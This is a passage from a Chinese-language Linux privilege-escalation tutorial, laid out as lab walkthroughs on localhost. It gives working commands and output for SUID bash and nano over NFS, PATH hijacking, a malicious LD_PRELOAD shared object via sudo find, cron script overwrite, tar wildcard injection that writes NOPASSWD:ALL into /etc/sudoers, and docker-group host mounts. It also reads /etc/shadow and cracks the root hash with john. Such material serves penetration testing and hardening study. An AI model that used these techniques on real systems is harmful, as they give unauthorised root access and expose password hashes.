<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># systemctl restart rpcbind</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># systemctl restart nfs</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>提权过程：
<span class="token number">1</span>.查看nfs服务器共享了什么目录
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># showmount -e 192.168.1.133</span>
Export list <span class="token keyword">for</span> <span class="token number">192.168</span>.1.133:
/shagou *

<span class="token number">2</span>.将服务器共享的目录挂载到另一台机的本地
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># mkdir bendi</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># mount -t nfs 192.168.1.133:/shagou ./bendi</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># cd ./bendi/</span>
<span class="token punctuation">[</span>root@localhost bendi<span class="token punctuation">]</span><span class="token comment"># cp /bin/bash ./</span>
<span class="token punctuation">[</span>root@localhost bendi<span class="token punctuation">]</span><span class="token comment"># chmod +s bash</span>
<span class="token punctuation">[</span>root@localhost bendi<span class="token punctuation">]</span><span class="token comment"># ls -al</span>
总用量 <span class="token number">944</span>
drwxrwxrwx. <span class="token number">2</span> root root     <span class="token number">18</span> <span class="token number">3</span>月  <span class="token number">12</span> 09:53 <span class="token builtin class-name">.</span>
dr-xr-x---. <span class="token number">6</span> root root    <span class="token number">273</span> <span class="token number">3</span>月  <span class="token number">12</span> 09:53 <span class="token punctuation">..</span>
-rwsr-sr-x. <span class="token number">1</span> root root <span class="token number">964536</span> <span class="token number">3</span>月  <span class="token number">12</span> 09:53 <span class="token function">bash</span>
<span class="token number">4</span>.让服务器的一个普通用户去执行bash文件
<span class="token punctuation">[</span>test@localhost shagou<span class="token punctuation">]</span>$ ./bash <span class="token parameter variable">-p</span>
bash-4.2<span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="nano" tabindex="-1"><a class="header-anchor" href="#nano" aria-hidden="true">#</a> nano</h5><ul><li>通过nano读取shadow文件</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>提权过程：
<span class="token number">1</span>.在另一台机器上复制nano到nfs服务器中，并添加suid
<span class="token punctuation">[</span>root@localhost bendi<span class="token punctuation">]</span><span class="token comment"># cp /usr/bin/nano ./</span>
<span class="token punctuation">[</span>root@localhost bendi<span class="token punctuation">]</span><span class="token comment"># chmod +s nano</span>
<span class="token punctuation">[</span>root@localhost bendi<span class="token punctuation">]</span><span class="token comment"># ls -al</span>
总用量 <span class="token number">1148</span>
drwxrwxrwx. <span class="token number">2</span> root root     <span class="token number">30</span> <span class="token number">3</span>月  <span class="token number">12</span> 09:56 <span class="token builtin class-name">.</span>
dr-xr-x---. <span class="token number">6</span> root root    <span class="token number">273</span> <span class="token number">3</span>月  <span class="token number">12</span> 09:53 <span class="token punctuation">..</span>
-rwsr-sr-x. <span class="token number">1</span> root root <span class="token number">964536</span> <span class="token number">3</span>月  <span class="token number">12</span> 09:53 <span class="token function">bash</span>
-rwsr-sr-x. <span class="token number">1</span> root root <span class="token number">205904</span> <span class="token number">3</span>月  <span class="token number">12</span> 09:56 <span class="token function">nano</span>

<span class="token number">2</span>.读取/etc/shadow文件，然后将想要破解的用户复制到另外的文件中。
<span class="token punctuation">[</span>test@localhost shagou<span class="token punctuation">]</span>$ ./nano <span class="token parameter variable">-p</span> /etc/shadow

<span class="token number">3</span>.利用john爆破密码
┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─<span class="token comment"># john shadow.txt</span>
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>sha512crypt, crypt<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token variable">$6</span>$ <span class="token punctuation">[</span>SHA512 <span class="token number">256</span>/256 AVX2 4x<span class="token punctuation">]</span><span class="token punctuation">)</span>
Cost <span class="token number">1</span> <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is <span class="token number">5000</span> <span class="token keyword">for</span> all loaded hashes
Will run <span class="token number">4</span> OpenMP threads
Proceeding with single, rules:Single
Press <span class="token string">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
Almost done: Processing the remaining buffered candidate passwords, <span class="token keyword">if</span> any.
Proceeding with wordlist:/usr/share/john/password.lst
<span class="token number">123456</span>           <span class="token punctuation">(</span>root<span class="token punctuation">)</span>
1g <span class="token number">0</span>:00:00:02 DONE <span class="token number">2</span>/3 <span class="token punctuation">(</span><span class="token number">2023</span>-03-12 <span class="token number">10</span>:23<span class="token punctuation">)</span> <span class="token number">0</span>.4310g/s 1512p/s 1512c/s 1512C/s <span class="token number">123456</span><span class="token punctuation">..</span>crawford
Use the <span class="token string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably

<span class="token comment">#如果结果已存在要加--show显示</span>
┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─<span class="token comment"># john --show shadow.txt</span>
root:123456::0:99999:7:::

<span class="token number">1</span> password <span class="token builtin class-name">hash</span> cracked, <span class="token number">0</span> left
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>通过nano编辑/etc/passwd文件，将普通用户修改为root权限用户</li><li>按照这种思路也可以修改/etc/sudoers文件</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>提权过程：
[test@localhost shagou]$ whoami
test
1.将1001:1001修改为0:0
[test@localhost shagou]$ ./nano -p /etc/passwd
[test@localhost shagou]$ whoami
whoami：无法找到用户ID 为1001 的用户名
[test@localhost shagou]$ su test
密码：
[root@localhost shagou]# whoami
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="path环境变量提权" tabindex="-1"><a class="header-anchor" href="#path环境变量提权" aria-hidden="true">#</a> PATH环境变量提权</h4><ul><li>Linux中的PATH是一个环境变量，它制定了可执行程序所在的目录，例如bin和sbin目录。当我们在终端运行一个目录时，系统就会根据PATH来查找相关的可执行文件。</li><li>可以通过env命令列出所有的环境变量，然后找到PATH，或者grep进行结果筛选，或者echo出$PATH值，命令如下：</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>[test@localhost shagou]$ env | grep &quot;^PATH&quot;
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin
[test@localhost shagou]$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="ps结合path提权" tabindex="-1"><a class="header-anchor" href="#ps结合path提权" aria-hidden="true">#</a> ps结合PATH提权</h5><ul><li>这种情况适用于：给普通用户分配了个可执行程序且该程序有suid权限，而且我们又知道该程序调用了哪些命令，那么就可以结合PATH来进行提权。</li><li>ps命令只是个例子，如果遇到id，whoami，cat，vim等等，都是可以的，只需修改tmp目录下的文件名即可。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>环境搭建：
<span class="token number">1</span>.管理员生成一个执行ps命令的程序
<span class="token punctuation">[</span>root@localhost shagou<span class="token punctuation">]</span><span class="token comment"># vim  psml.c</span>
<span class="token comment">#include&lt;unistd.h&gt;</span>
void <span class="token function-name function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
        setuid<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        setgid<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        system<span class="token punctuation">(</span><span class="token string">&quot;ps&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">[</span>root@localhost shagou<span class="token punctuation">]</span><span class="token comment"># gcc psml.c -o psml</span>

<span class="token number">2</span>.添加SUID权限。并让普通用户有执行权。
<span class="token punctuation">[</span>root@localhost shagou<span class="token punctuation">]</span><span class="token comment"># chmod +s psml</span>
<span class="token punctuation">[</span>root@localhost shagou<span class="token punctuation">]</span><span class="token comment"># chmod 777 psml</span>

提权过程：
<span class="token number">1</span>.在tmp目录下，将/bin/bash写进一个叫ps的文件中，然后赋予执行权限。或者将/bin/bash复制，然后将bash改名成ps。又或者使用符号链接，不过在tmp目录不可以，要在其他目录。
<span class="token punctuation">[</span>test@localhost tmp<span class="token punctuation">]</span>$ <span class="token builtin class-name">echo</span> <span class="token string">&quot;/bin/bash&quot;</span> <span class="token operator">&gt;</span> <span class="token function">ps</span>
<span class="token punctuation">[</span>test@localhost tmp<span class="token punctuation">]</span>$ <span class="token function">chmod</span> <span class="token number">777</span> <span class="token function">ps</span>
<span class="token number">2</span>.修改环境变量，将tmp目录加入环境变量中。
<span class="token punctuation">[</span>test@localhost tmp<span class="token punctuation">]</span>$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin
<span class="token punctuation">[</span>test@localhost tmp<span class="token punctuation">]</span>$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp:<span class="token environment constant">$PATH</span>
<span class="token punctuation">[</span>test@localhost tmp<span class="token punctuation">]</span>$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin
<span class="token number">3</span>.执行psml，就会通过psml中执行ps命令，ps通过查询环境变量，找到/tmp，执行/tmp中的ps。
<span class="token punctuation">[</span>test@localhost shagou<span class="token punctuation">]</span>$ ./psml
<span class="token punctuation">[</span>root@localhost shagou<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root

<span class="token number">1</span>.使用符号链接方式
<span class="token punctuation">[</span>test@localhost shagou<span class="token punctuation">]</span>$ <span class="token function">ln</span> <span class="token parameter variable">-s</span> /bin/bash ./ps
root@localhost shagou<span class="token punctuation">]</span><span class="token comment"># ls</span>
<span class="token function">bash</span>  <span class="token function">nano</span>  <span class="token function">ps</span>  psml  psml.c  pspath
<span class="token punctuation">[</span>test@localhost shagou<span class="token punctuation">]</span>$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>.:<span class="token environment constant">$PATH</span>
<span class="token punctuation">[</span>test@localhost shagou<span class="token punctuation">]</span>$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>
.:/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin
<span class="token punctuation">[</span>test@localhost shagou<span class="token punctuation">]</span>$ ./psml
<span class="token punctuation">[</span>root@localhost shagou<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="ld-preload预先加载提权" tabindex="-1"><a class="header-anchor" href="#ld-preload预先加载提权" aria-hidden="true">#</a> LD_PRELOAD预先加载提权</h4><ul><li>LD_PRELOAD是Linux的一个环境变量，程序运行时都会加载一些so文件，类似于windows下程序加载dll，而LD_PRELOAD可以指定程序运行前加载的动态链接库。</li></ul><h5 id="find-2" tabindex="-1"><a class="header-anchor" href="#find-2" aria-hidden="true">#</a> find</h5><ul><li>当我们有一个find的sudo权，且env_keep中定义了LD_PRELOAD，那么我们就可以定义一个恶意的so文件，然后sudo运行find的时候指定LD_PRELOAD来加载我们自己的so文件，那么就可以实现提权。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>环境搭建：
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># vim /etc/sudoers</span>
Defaults        env_keep <span class="token operator">+=</span> LD_PRELOAD <span class="token comment">#环境变量不受用户切换影响。</span>
<span class="token builtin class-name">test</span>    <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD:/usr/bin/find <span class="token comment">#免密以root权限使用find。</span>

提权流程：
<span class="token number">1</span>.准备一个恶意的so文件
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">vim</span> shell.c
<span class="token comment">#include &lt;stdio.h&gt;</span>
<span class="token comment">#include &lt;sys/types.h&gt;</span>
<span class="token comment">#include &lt;stdlib.h&gt;</span>
void <span class="token function-name function">_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
        unsetenv<span class="token punctuation">(</span><span class="token string">&quot;LD_PRELOAD&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        setgid<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        setuid<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        system<span class="token punctuation">(</span><span class="token string">&quot;/bin/bash&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">#-fPIC -shared参数：动态编辑共享库，可以进行公共调用。</span>
<span class="token comment">#-nostartfiles参数：表示该库运行不会调用系统的其他库，避免影响自己的程序执行。</span>
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ gcc shell.c <span class="token parameter variable">-fPIC</span> <span class="token parameter variable">-shared</span> <span class="token parameter variable">-o</span> shell.so <span class="token parameter variable">-nostartfiles</span>

<span class="token number">2</span>.赋予执行权限，并使用sudo执行
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">chmod</span> +x shell.so
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token assign-left variable">LD_PRELOAD</span><span class="token operator">=</span>./shell.so <span class="token function">find</span>
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="cron提权" tabindex="-1"><a class="header-anchor" href="#cron提权" aria-hidden="true">#</a> Cron提权</h4><img src="`+u+`"><h5 id="定时任务文件修改-覆盖" tabindex="-1"><a class="header-anchor" href="#定时任务文件修改-覆盖" aria-hidden="true">#</a> 定时任务文件修改/覆盖</h5><ul><li>假设存在一个通过定时任务去执行的文件，我们可以去修改文件内容实现提权。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>环境搭建
<span class="token number">1</span>.编写一个定时清理文件的py文件，赋予执行权限。
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># vim clear.py</span>
<span class="token comment">#! /usr/bin/env python3</span>
<span class="token function">import</span> os
<span class="token function">import</span> sys
try:
        os.system<span class="token punctuation">(</span><span class="token string">&#39;rm -rf /tmp/shagou/*&#39;</span><span class="token punctuation">)</span>
except:
        sys.exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># chmod +x clear.py</span>

<span class="token number">2</span>.配置定时任务，每一分钟执行一次。
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># vim /etc/crontab</span>
*/1 * * * * root /home/test/clear.py

提权过程：
<span class="token number">1</span>.直接修改脚本文件
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> clear.py
<span class="token comment">#! /usr/bin/env python3</span>
<span class="token function">import</span> os
<span class="token function">import</span> sys
try:
        os.system<span class="token punctuation">(</span><span class="token string">&#39;chmod +s /usr/bin/bash&#39;</span><span class="token punctuation">)</span>
except:
        sys.exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token number">2</span>.等待定时任务执行
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ ll /usr/bin/bash
-rwxr-xr-x. <span class="token number">1</span> root root <span class="token number">964536</span> <span class="token number">4</span>月   <span class="token number">1</span> <span class="token number">2020</span> /usr/bin/bash
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ ll /usr/bin/bash	<span class="token comment">#查看到有suid权限，加上-p执行</span>
-rwsr-sr-x. <span class="token number">1</span> root root <span class="token number">964536</span> <span class="token number">4</span>月   <span class="token number">1</span> <span class="token number">2020</span> /usr/bin/bash
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ /usr/bin/bash <span class="token parameter variable">-p</span>
bash-4.2<span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="通配符提权" tabindex="-1"><a class="header-anchor" href="#通配符提权" aria-hidden="true">#</a> 通配符提权</h5><ul><li>假设有个定时任务是通过tar定时压缩某文件的内容，如果定时任务脚本中tar压缩使用通配符（*，当前目录下的所有文件），由于文件名如果和命令参数相同的话会那么就会执行命令参数，而不去执行该文件。</li><li>在tar命令中有一个checkpoin参数，如--checkpoint=1表示压缩过程中每压缩一个文件就去执行一个检查操作。而这个检查操作参数是--checkpoint-action=exec=，后面可以跟要执行的命令</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>环境搭建
<span class="token number">1</span>.配置定时任务文件并赋予执行权限。该脚本的意思压缩/var/www/html/这个目录下的所有文件到/home/test/，并且压缩包的名字为html.tar。
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># vim backup.sh</span>
<span class="token comment">#!/bin/bash</span>
<span class="token builtin class-name">cd</span> /var/www/html/
<span class="token function">tar</span> cf /home/test/html.tar *
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># chmod +x backup.sh</span>

<span class="token number">2</span>.编辑定时任务
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># vim /etc/crontab</span>
*/1 * * * * root /home/test/backup.sh

提权过程
<span class="token number">1</span>.在要被压缩的目录下执行以下命令，创建这些文件。
<span class="token punctuation">[</span>test@localhost html<span class="token punctuation">]</span>$ <span class="token builtin class-name">pwd</span>
/var/www/html
<span class="token builtin class-name">echo</span> <span class="token string">&#39;echo &quot;test ALL=(root) NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers&#39;</span> <span class="token operator">&gt;</span> test.sh
<span class="token builtin class-name">echo</span> <span class="token string">&quot;&quot;</span> <span class="token operator">&gt;</span> <span class="token parameter variable">--checkpoint</span><span class="token operator">=</span><span class="token number">1</span>
<span class="token builtin class-name">echo</span> <span class="token string">&quot;&quot;</span> <span class="token operator">&gt;</span> <span class="token string">&quot;--checkpoint-action=exec=bash test.sh&quot;</span>
<span class="token punctuation">[</span>test@localhost html<span class="token punctuation">]</span>$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
总用量 <span class="token number">12</span>
drwxr-xr-x. <span class="token number">3</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span> <span class="token number">101</span> <span class="token number">3</span>月  <span class="token number">12</span> <span class="token number">17</span>:23 <span class="token builtin class-name">.</span>
drwxr-xr-x. <span class="token number">4</span> root root  <span class="token number">34</span> <span class="token number">3</span>月  <span class="token number">12</span> <span class="token number">17</span>:22 <span class="token punctuation">..</span>
-rw-rw-r--. <span class="token number">1</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span>   <span class="token number">1</span> <span class="token number">3</span>月  <span class="token number">12</span> <span class="token number">17</span>:23 <span class="token parameter variable">--checkpoint</span><span class="token operator">=</span><span class="token number">1</span>
-rw-rw-r--. <span class="token number">1</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span>   <span class="token number">1</span> <span class="token number">3</span>月  <span class="token number">12</span> <span class="token number">17</span>:23 --checkpoint-action<span class="token operator">=</span>exec<span class="token operator">=</span>bash test.sh
drwxr-xr-x. <span class="token number">2</span> root root   <span class="token number">6</span> <span class="token number">3</span>月  <span class="token number">12</span> <span class="token number">17</span>:22 dasda
-rw-rw-r--. <span class="token number">1</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span>  <span class="token number">52</span> <span class="token number">3</span>月  <span class="token number">12</span> <span class="token number">17</span>:23 test.sh

<span class="token number">2</span>.等待计划任务执行完毕
<span class="token punctuation">[</span>test@localhost html<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
匹配 %2<span class="token variable">$s</span> 上 %1<span class="token variable">$s</span> 的默认条目：
    <span class="token operator">!</span>visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, <span class="token assign-left variable">env_keep</span><span class="token operator">=</span><span class="token string">&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;</span>,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/sbin<span class="token punctuation">\\</span>:/bin<span class="token punctuation">\\</span>:/usr/sbin<span class="token punctuation">\\</span>:/usr/bin, <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span>LD_PRELOAD

用户 <span class="token builtin class-name">test</span> 可以在 localhost 上运行以下命令：
    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: ALL

<span class="token punctuation">[</span>test@localhost html<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">bash</span>
<span class="token punctuation">[</span>root@localhost html<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="docker提权" tabindex="-1"><a class="header-anchor" href="#docker提权" aria-hidden="true">#</a> docker提权</h4><ul><li>在docker中，docker组中的用户可以访问root权限的文件。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>环境搭建
<span class="token number">1</span>.首先，root配置不当，将一个普通账户添加到了docker组中。
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># usermod -G docker test</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># id test</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span> 组<span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span>,982<span class="token punctuation">(</span>docker<span class="token punctuation">)</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># newgrp docker #用户环境重新初始化</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># cat /etc/group | grep test</span>
docker:x:982:test
test:x:1001:
<span class="token punctuation">[</span>test@localhost root<span class="token punctuation">]</span>$ <span class="token function">groups</span> <span class="token builtin class-name">test</span>
<span class="token builtin class-name">test</span> <span class="token builtin class-name">:</span> <span class="token builtin class-name">test</span> <span class="token function">docker</span>

提权过程
<span class="token number">1</span>.运行alpine镜像，-v为将宿主机的/root目录挂载到镜像的/mnt目录下，-i为保持打开状态，-t为分配一个tty终端
<span class="token punctuation">[</span>test@localhost root<span class="token punctuation">]</span>$ <span class="token function">docker</span> run <span class="token parameter variable">-v</span> /root:/mnt <span class="token parameter variable">-it</span> alpine
<span class="token number">2</span>.进入/mnt目录即可查看到root用户的家目录
/mnt <span class="token comment"># ls</span>
<span class="token number">123</span>                   bendi
anaconda-ks.cfg       initial-setup-ks.cfg

通过挂载etc目录可实现修改shadow、passwd等文件内容，可直接将passwd文件中普通用户的权限改为0:0即为root权限。
<span class="token punctuation">[</span>test@localhost root<span class="token punctuation">]</span>$ <span class="token function">docker</span> run <span class="token parameter variable">-v</span> /etc:/mnt <span class="token parameter variable">-it</span> alpine
/ <span class="token comment"># cd /mnt/</span>
/ <span class="token comment"># ls</span>
